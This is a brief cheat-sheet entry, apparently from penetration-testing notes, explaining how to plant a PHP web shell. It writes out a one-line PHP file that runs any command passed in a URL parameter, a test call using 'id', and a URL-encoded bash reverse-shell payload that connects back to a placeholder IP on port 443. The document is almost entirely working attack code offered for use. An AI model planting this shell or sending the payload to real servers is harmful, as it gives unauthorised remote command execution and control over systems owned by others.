## webshell

write a file with the following content:

```php
<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>
```

call the file with the parameter `?cmd=id` to check if it worked then exploit:
```bash
?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<IP>%2F443%200%3E%261%22
```